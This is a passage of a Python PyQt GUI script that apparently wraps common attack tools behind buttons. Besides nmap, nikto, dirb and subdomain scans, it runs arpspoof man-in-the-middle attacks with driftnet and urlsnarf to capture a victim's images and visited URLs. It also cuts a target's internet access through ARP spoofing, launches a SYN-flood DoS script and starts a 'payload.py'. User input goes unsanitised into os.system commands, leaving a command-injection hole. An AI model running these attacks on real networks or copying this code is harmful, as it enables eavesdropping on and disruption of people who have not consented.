            msg1.exec_()
    def nmap_10(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("IPV6 scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("IPV6 scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -6 {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_11(self):
        if self.lineEdit_site.text()=="" and self.lineEdit_port.text()=="":
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Warning)
            msg2.setText("Please enter the site adress or IP adress and port numbers!")
            msg2.exec_()
        elif self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        elif self.lineEdit_port.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the ports!")
            msg6.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Port version scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Port version scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -sS -sV -sC -n -v -p {} {} -oN output.txt".format(self.lineEdit_port.text(),self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_12(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Host scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Host scan is starting,please wait...")
            msg.exec_()
            os.system("nmap -sP -T4 {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_13(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Standard scan is starting,please wait...")
            msg.exec_()
            os.system("nmap {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_14(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Standard scan is starting,please wait...")
            msg.exec_()
            os.system("nmap {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def nmap_15(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Standard scan is starting,please wait...")
            msg.exec_()
            os.system("nmap {} -oN output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            file.close()
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Scan completed successfully")
            msg1.exec_()
    def clear(self):
        self.plainTextEdit_result.clear()
    def sniff_image(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and router IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the router IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            os.system("gnome-terminal -x driftnet -i eth0")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setText("Attack initiating,please wait...")
            msg.setIcon(QMessageBox.Information)
            msg.exec_()
    def sniff_url(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and router IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the router IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            os.system("gnome-terminal -x urlsnarf -i eth0")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setText("Attack initiating,please wait...")
            msg.setIcon(QMessageBox.Information)
            msg.exec_()
    def block_net(self):
        if self.lineEdit_router_ip_address.text()=="" and self.lineEdit_target_ip_address.text()=="":
            msg9 = QMessageBox()
            msg9.setWindowTitle("Information")
            msg9.setBaseSize(300,300)
            msg9.setIcon(QMessageBox.Warning)
            msg9.setText("Please enter the target IP address and router IP address! !")
            msg9.exec_()
        elif self.lineEdit_router_ip_address.text()=="":
            msg6 = QMessageBox()
            msg6.setWindowTitle("Information")
            msg6.setBaseSize(300,300)
            msg6.setIcon(QMessageBox.Warning)
            msg6.setText("Please enter the router IP address!")
            msg6.exec_()
        elif self.lineEdit_target_ip_address.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the target IP address!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:red;")
            self.plainTextEdit_result.insertPlainText("To stop the attack, close the terminals with ctrl+c .")
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Attack initiating,please wait...")
            msg.exec_() 
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_router_ip_address.text(),self.lineEdit_target_ip_address.text()))
            os.system("gnome-terminal -x arpspoof -i eth0 -t {} {} ".format(self.lineEdit_target_ip_address.text(),self.lineEdit_router_ip_address.text()))
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("IP forwarding: 0")
            msg1.exec_() 
    def free_net(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:red;")
        self.plainTextEdit_result.insertPlainText("The target's Internet is unlocked")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setIcon(QMessageBox.Information)
        msg.setText("IP Forwarding: 1")
        msg.exec_()
    def network_scaner(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Local network scanning,please wait...")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setText("Local network scanning,please wait...")
        msg.setIcon(QMessageBox.Information)
        msg.exec_()
        os.system("gnome-terminal -x python3 network_scanner.py")
        self.plainTextEdit_result.clear()
    def netdiscover(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Local network scanning,please wait...")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setText("Local network scanning,please wait...")
        msg.setIcon(QMessageBox.Information)
        msg.exec_()
        os.system("gnome-terminal -x netdiscover -r 192.168.1.0/16")
        self.plainTextEdit_result.clear()
    def nmap_network_scanner(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Nmap local network scanning,please wait...")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setText("Nmap local network scanning,please wait...")
        msg.setIcon(QMessageBox.Information)
        msg.exec_()
        os.system("nmap -sn -n -v --open 192.168.1.0/24 -oN output.txt")
        file=open("output.txt","r")
        info=file.read()
        file.close()
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.insertPlainText(info)
        msg1 = QMessageBox()
        msg1.setWindowTitle("Information")
        msg1.setBaseSize(300,300)
        msg1.setText("Nmap local network scan completed successfully.")
        msg1.setIcon(QMessageBox.Information)
        msg1.exec_()
    def payload(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Application is starting...")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setText("Application is started")
        msg.setIcon(QMessageBox.Information)
        msg.exec_()
        os.system("gnome-terminal -x python3 payload.py")
        self.plainTextEdit_result.clear()
    def macchanger_random(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Changing mac address,please wait...")
        os.system("macchanger -r wlan0")
        os.system("macchanger -r eth0")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setIcon(QMessageBox.Information)
        msg.setText("Mac address changed successfully (RANDOM MAC ADDRESS)")
        msg.exec_()
        self.plainTextEdit_result.clear()
    def macchanger_original(self):
        self.plainTextEdit_result.clear()
        self.plainTextEdit_result.setStyleSheet("color:white;")
        self.plainTextEdit_result.insertPlainText("Changing mac address,please wait...")
        os.system("macchanger -p wlan0")
        os.system("macchanger -p eth0")
        msg = QMessageBox()
        msg.setWindowTitle("Information")
        msg.setBaseSize(300,300)
        msg.setIcon(QMessageBox.Information)
        msg.setText("Mac address changed successfully (Original MAC ADDRESS)")
        msg.exec_()
        self.plainTextEdit_result.clear()
    def firewall_detection(self):
        if self.lineEdit_site.text()=="":
            msg5 = QMessageBox()
            msg5.setWindowTitle("Information")
            msg5.setBaseSize(300,300)
            msg5.setIcon(QMessageBox.Warning)
            msg5.setText("Please enter the site adress or IP adress!")
            msg5.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.setStyleSheet("color:white;")
            self.plainTextEdit_result.insertPlainText("Firewall detection is starting,please wait...")
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Information)
            msg1.setText("Firewall detection is starting,please wait...")
            msg1.exec_()
            os.system("wafw00f {} -o output.txt".format(self.lineEdit_site.text()))
            file=open("output.txt","r")
            info=file.read()
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText(info)
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Information)
            msg2.setText("Firewall detection is finished.")
            msg2.exec_()
    def dos_attack(self):
        if self.lineEdit_site.text()=="":
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Warning)
            msg1.setText("Please enter the site adress or IP adress!")
            msg1.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Dos Attack is starting,please wait...")
            os.system("gnome-terminal -x python3 dos.py -s {} -p 80 -t 135".format(self.lineEdit_site.text()))
            msg = QMessageBox()
            msg.setWindowTitle("Information")
            msg.setBaseSize(300,300)
            msg.setIcon(QMessageBox.Information)
            msg.setText("Dos attack is starting...")
            msg.exec_()
            self.plainTextEdit_result.clear()
            time.sleep(5)
            for i in range(500):
                self.plainTextEdit_result.setStyleSheet("color:red;")
                self.plainTextEdit_result.appendPlainText(f"{i}:Denial of service attack, SYN packet send.") 
    def subdomain(self):
        if self.lineEdit_site.text()=="":
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Warning)
            msg1.setText("Please enter the site adress or IP adress!")
            msg1.exec_()
        elif self.lineEdit_site.text()[0]=="1" or self.lineEdit_site.text()[0]=="2" or self.lineEdit_site.text()[0]=="3" or self.lineEdit_site.text()[0]=="4" or self.lineEdit_site.text()[0]== "5" or self.lineEdit_site.text()[0]=="6" or self.lineEdit_site.text()[0]== "7" or self.lineEdit_site.text()[0]== "8" or self.lineEdit_site.text()[0]== "9":
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
            os.system("gnome-terminal -x dnsmap {}".format(self.lineEdit_site.text()))
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Warning)
            msg2.setText("Searching subdomains,please wait...")
            msg2.exec_()
            self.plainTextEdit_result.clear()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Searching subdomains,please wait...")
            os.system("gnome-terminal -x dnsmap {}".format(self.lineEdit_site.text()[4:]))
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Warning)
            msg2.setText("Searching subdomains,please wait...")
            msg2.exec_()
            self.plainTextEdit_result.clear()
    def dmitryscan(self):
        if self.lineEdit_site.text()=="":
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Warning)
            msg1.setText("Please enter the site adress or IP adress!")
            msg1.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Searching subdomains,ports,mails,please wait...")
            os.system("gnome-terminal -x dmitry -winsepfb {}".format(self.lineEdit_site.text()))
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Information)
            msg2.setText("Searching subdomains,ports,mails,please wait...")
            msg2.exec_()
            self.plainTextEdit_result.clear()
    def dirb(self):
        if self.lineEdit_site.text()=="":
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Warning)
            msg1.setText("Please enter the site adress or IP adress!")
            msg1.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Searching website folders wait...")
            os.system("gnome-terminal -x dirb https://{}".format(self.lineEdit_site.text()))
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Information)
            msg2.setText("Searching website folders wait...")
            msg2.exec_()
            self.plainTextEdit_result.clear()
    def nikto(self):
        if self.lineEdit_site.text()=="":
            msg1 = QMessageBox()
            msg1.setWindowTitle("Information")
            msg1.setBaseSize(300,300)
            msg1.setIcon(QMessageBox.Warning)
            msg1.setText("Please enter the site adress or IP adress!")
            msg1.exec_()
        else:
            self.plainTextEdit_result.clear()
            self.plainTextEdit_result.insertPlainText("Searching website vulnerability wait...")
            os.system("gnome-terminal -x nikto -h {}".format(self.lineEdit_site.text()))
            msg2 = QMessageBox()
            msg2.setWindowTitle("Information")
            msg2.setBaseSize(300,300)
            msg2.setIcon(QMessageBox.Information)
            msg2.setText("Searching website vulnerability wait...")
            msg2.exec_()
            self.plainTextEdit_result.clear()              
##################################---------Functions--------##################################
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())













